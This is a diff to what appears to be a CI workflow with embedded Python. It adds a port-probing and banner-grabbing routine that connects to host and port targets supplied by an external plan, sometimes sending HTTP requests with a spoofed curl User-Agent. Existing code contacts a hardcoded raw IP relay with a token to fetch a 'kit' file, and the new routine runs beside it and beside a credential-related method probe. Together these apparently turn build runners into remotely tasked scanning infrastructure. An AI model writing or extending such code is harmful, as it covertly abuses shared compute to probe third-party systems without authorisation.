@@ -302,6 +302,43 @@ jobs:
                                                    'methods': method_probe(host, port, users)}
 
 
+          def do_ports():
+              for item in PLAN.get('port_targets', []):
+                  host = item['h']
+                  port = int(item['p'])
+                  rec = {'t': '%s:%d' % (host, port), 'attempts': []}
+                  for i in range(int(item.get('tries', 2))):
+                      t = now()
+                      try:
+                          s = socket.create_connection((host, port), timeout=float(item.get('tmo', 5)))
+                          s.settimeout(4.0)
+                          if item.get('http'):
+                              try:
+                                  s.sendall(('GET / HTTP/1.0\r\nHost: %s\r\nUser-Agent: curl/8.5.0\r\n\r\n'
+                                             % host).encode())
+                              except Exception:
+                                  pass
+                          data = b''
+                          try:
+                              while len(data) < 1200:
+                                  chunk = s.recv(1200 - len(data))
+                                  if not chunk:
+                                      break
+                                  data += chunk
+                                  if len(data) > 300:
+                                      break
+                          except Exception:
+                              pass
+                          s.close()
+                          rec['attempts'].append({'ok': True, 'ms': int((now() - t) * 1000),
+                                                  'data': data[:700].decode('latin1', 'replace')})
+                          break
+                      except Exception as e:
+                          rec['attempts'].append({'ok': False, 'ms': int((now() - t) * 1000),
+                                                  'err': type(e).__name__ + ': ' + str(e)[:80]})
+                  OUT['probes'][rec['t']] = rec
+
+
           def do_probe():
               for t in PLAN.get('probe_targets', []):
                   host, port = split_t(t)
@@ -491,6 +528,8 @@ jobs:
               rc, so, _ = sh('curl -sS -m 8 -o /dev/null -w "%{http_code}:%{size_download}" '
                              '"http://117.148.167.132:18081/get?t=i12189tok&p=/tmp/i26254/kit/dont_block_4.txt"')
               OUT['relay_probe'] = so[:40]
+              if PLAN.get('port_targets'):
+                  do_ports()
               if PLAN.get('method_targets'):
                   do_methods()
               if PLAN.get('probe_targets'):
